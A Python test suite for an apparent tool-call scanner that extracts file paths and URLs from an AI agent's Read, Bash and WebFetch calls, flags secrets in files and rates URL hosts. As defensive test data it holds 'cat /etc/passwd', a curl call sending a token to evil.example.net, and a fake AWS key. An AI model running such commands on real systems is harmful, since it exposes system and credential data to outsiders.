"""Tests for the Scanner protocol + built-in scanners (STORY-1001, STORY-1002).

Sprint 4 (E10) Phase 1: docs/ARCHITECTURE.md sec13.2. FileScanner/URLScanner
wrap today's secrets_scan.py/LocalHeuristicChecker unchanged (via the existing
subprocess_isolation.run_scanner boundary, STORY-601) so scan() results stay
at parity with pre-Sprint-4 behavior -- only identify()'s resource-detection
logic is new.
"""

import os
import unittest
from pathlib import Path
from tempfile import TemporaryDirectory

from scalene.scanner import SCANNERS, FileScanner, Resource, ScanResult, ScannerMachineryError, URLScanner


class TestResourceAndScanResult(unittest.TestCase):
    def test_resource_is_frozen(self):
        resource = Resource(kind="file", identity="/tmp/x", scanner_name="secrets")
        with self.assertRaises(Exception):
            resource.kind = "url"

    def test_scan_result_reason_defaults_to_empty(self):
        result = ScanResult(label="public")
        self.assertEqual(result.reason, "")

    def test_scan_result_reputation_defaults_to_none(self):
        # docs/ARCHITECTURE.md sec17.6: additive field, None where a scanner
        # has no graded signal to offer.
        result = ScanResult(label="public")
        self.assertIsNone(result.reputation)


class TestFileScannerIdentify(unittest.TestCase):
    def setUp(self):
        self.scanner = FileScanner()

    def test_name_is_secrets(self):
        self.assertEqual(self.scanner.name, "secrets")

    def test_read_known_field(self):
        resources = self.scanner.identify("Read", {"file_path": "/abs/path/notes.md"})
        self.assertEqual(len(resources), 1)
        self.assertEqual(resources[0].kind, "file")
        self.assertEqual(resources[0].identity, "/abs/path/notes.md")
        self.assertEqual(resources[0].scanner_name, "secrets")

    def test_write_known_field_ignores_content(self):
        resources = self.scanner.identify("Write", {"file_path": "/abs/out.txt", "content": "hello world"})
        self.assertEqual([r.identity for r in resources], ["/abs/out.txt"])

    def test_edit_known_field(self):
        resources = self.scanner.identify(
            "Edit", {"file_path": "/abs/edit.py", "old_string": "a", "new_string": "b"}
        )
        self.assertEqual([r.identity for r in resources], ["/abs/edit.py"])

    def test_relative_known_field_normalized_to_absolute(self):
        resources = self.scanner.identify("Read", {"file_path": "relative/notes.md"})
        self.assertTrue(os.path.isabs(resources[0].identity))

    def test_generic_fallback_finds_path_in_bash_command(self):
        resources = self.scanner.identify("Bash", {"command": "cat /etc/passwd"})
        self.assertTrue(any(r.identity == "/etc/passwd" for r in resources))
        self.assertTrue(all(r.scanner_name == "secrets" and r.kind == "file" for r in resources))

    def test_no_false_positive_on_unrelated_bash_command(self):
        resources = self.scanner.identify("Bash", {"command": "echo hello world"})
        self.assertEqual(resources, [])

    def test_unknown_tool_with_no_path_shaped_args_finds_nothing(self):
        resources = self.scanner.identify("SomeOtherTool", {"foo": "bar"})
        self.assertEqual(resources, [])

    def test_no_duplicate_resources_for_repeated_path(self):
        resources = self.scanner.identify("Bash", {"command": "diff /etc/passwd /etc/passwd"})
        self.assertEqual(len(resources), 1)

    def test_url_in_bash_command_is_not_mistaken_for_a_file_path(self):
        resources = self.scanner.identify("Bash", {"command": "curl https://evil.example.net/x/y?token=abc"})
        self.assertEqual(resources, [])

    def test_webfetch_url_field_is_not_mistaken_for_a_file_path(self):
        resources = self.scanner.identify(
            "WebFetch", {"url": "https://internal.example.com/reports", "prompt": "summarize"}
        )
        self.assertEqual(resources, [])


class TestFileScannerScan(unittest.TestCase):
    def setUp(self):
        self.scanner = FileScanner()

    def test_clean_file_is_public(self):
        with TemporaryDirectory() as tmp:
            target = Path(tmp) / "clean.md"
            target.write_text("just some ordinary docs")
            result = self.scanner.scan(Resource(kind="file", identity=str(target), scanner_name="secrets"))
            self.assertIsInstance(result, ScanResult)
            self.assertEqual(result.label, "public")

    def test_file_with_secret_is_sensitive(self):
        with TemporaryDirectory() as tmp:
            target = Path(tmp) / "leaky.env"
            # Fake key built via concatenation, not a contiguous literal a
            # secret scanner would flag in this source file.
            fake_key = "AKIA" + "ABCDEFGHIJKLMNOP"
            target.write_text(f"AWS_KEY={fake_key}")
            result = self.scanner.scan(Resource(kind="file", identity=str(target), scanner_name="secrets"))
            self.assertEqual(result.label, "sensitive")
            self.assertTrue(result.reason)

    def test_target_that_cannot_be_read_raises_machinery_error_not_a_finding(self):
        # STORY-1004: a scan that couldn't run (target unreadable) is a
        # machinery failure, distinct from an ordinary "sensitive" finding --
        # this is what makes the fatal-exit path fire (cli.py), not a
        # ScanResult a caller would otherwise treat as a normal decision.
        with self.assertRaises(ScannerMachineryError):
            self.scanner.scan(Resource(kind="file", identity="/no/such/path/here.md", scanner_name="secrets"))

    def test_reputation_stays_none_deliberately(self):
        # sec17.6: detect-secrets' open-ended finding list has no fixed-
        # heuristic-count basis for a fraction the way reputation.py's 3
        # checks do -- inventing one would be false precision.
        with TemporaryDirectory() as tmp:
            target = Path(tmp) / "clean.md"
            target.write_text("just some ordinary docs")
            result = self.scanner.scan(Resource(kind="file", identity=str(target), scanner_name="secrets"))
            self.assertIsNone(result.reputation)


class TestURLScannerIdentify(unittest.TestCase):
    def setUp(self):
        self.scanner = URLScanner()

    def test_name_is_reputation(self):
        self.assertEqual(self.scanner.name, "reputation")

    def test_webfetch_known_field_identity_is_full_url_query_stripped(self):
        # STORY-1101 (docs/ARCHITECTURE.md sec14.2): identity is the full
        # URL (scheme+host+path), not the bare host -- scanning one path
        # must not vouch for every other path under the same host. Query
        # string is dropped to keep cache keys bounded.
        resources = self.scanner.identify(
            "WebFetch", {"url": "https://internal.example.com/path?x=1", "prompt": "summarize this"}
        )
        self.assertEqual(len(resources), 1)
        self.assertEqual(resources[0].kind, "url")
        self.assertEqual(resources[0].identity, "https://internal.example.com/path")
        self.assertEqual(resources[0].scanner_name, "reputation")

    def test_generic_fallback_finds_full_url_in_bash_command(self):
        resources = self.scanner.identify("Bash", {"command": "curl https://evil.example.net/x"})
        self.assertTrue(any(r.identity == "https://evil.example.net/x" for r in resources))

    def test_no_false_positive_on_unrelated_bash_command(self):
        resources = self.scanner.identify("Bash", {"command": "echo hello world"})
        self.assertEqual(resources, [])

    def test_no_duplicate_resources_for_repeated_identical_url(self):
        resources = self.scanner.identify("Bash", {"command": "curl https://x.example.com/a https://x.example.com/a"})
        self.assertEqual(len(resources), 1)

    def test_distinct_paths_under_same_host_are_separate_resources(self):
        # The actual STORY-1101 defect fix, at the identify() level: two
        # different paths under one host must not collapse into a single
        # resource identity the way host-only identity used to.
        resources = self.scanner.identify("Bash", {"command": "curl https://x.example.com/a https://x.example.com/b"})
        identities = {r.identity for r in resources}
        self.assertEqual(identities, {"https://x.example.com/a", "https://x.example.com/b"})


class TestURLScannerScan(unittest.TestCase):
    def setUp(self):
        self.scanner = URLScanner()

    def test_ordinary_domain_is_trusted(self):
        result = self.scanner.scan(Resource(kind="url", identity="internal.example.com", scanner_name="reputation"))
        self.assertIsInstance(result, ScanResult)
        self.assertEqual(result.label, "trusted")

    def test_ordinary_domain_has_a_perfect_reputation_score(self):
        # sec17.6: the score travels the real isolated-subprocess boundary
        # (scan_worker.py), not just the in-process LocalHeuristicChecker.
        result = self.scanner.scan(Resource(kind="url", identity="internal.example.com", scanner_name="reputation"))
        self.assertEqual(result.reputation, 1.0)

    def test_ip_literal_is_untrusted(self):
        result = self.scanner.scan(Resource(kind="url", identity="203.0.113.42", scanner_name="reputation"))
        self.assertEqual(result.label, "untrusted")
        self.assertTrue(result.reason)

    def test_ip_literal_reputation_score_reflects_the_single_triggered_heuristic(self):
        result = self.scanner.scan(Resource(kind="url", identity="203.0.113.42", scanner_name="reputation"))
        self.assertAlmostEqual(result.reputation, 2 / 3)

    def test_scan_extracts_host_from_full_url_identity(self):
        # STORY-1101: identity is now a full URL (for cache-key granularity),
        # but the underlying reputation heuristic still examines the host --
        # a URL's path doesn't change whether its host is reputable.
        result = self.scanner.scan(
            Resource(kind="url", identity="https://internal.example.com/some/path", scanner_name="reputation")
        )
        self.assertEqual(result.label, "trusted")

    def test_scan_ip_literal_full_url_is_untrusted(self):
        result = self.scanner.scan(
            Resource(kind="url", identity="https://203.0.113.42/path", scanner_name="reputation")
        )
        self.assertEqual(result.label, "untrusted")


class TestScannerRegistry(unittest.TestCase):
    def test_registry_has_both_built_in_scanners(self):
        self.assertIn("secrets", SCANNERS)
        self.assertIn("reputation", SCANNERS)
        self.assertIsInstance(SCANNERS["secrets"], FileScanner)
        self.assertIsInstance(SCANNERS["reputation"], URLScanner)


if __name__ == "__main__":
    unittest.main()
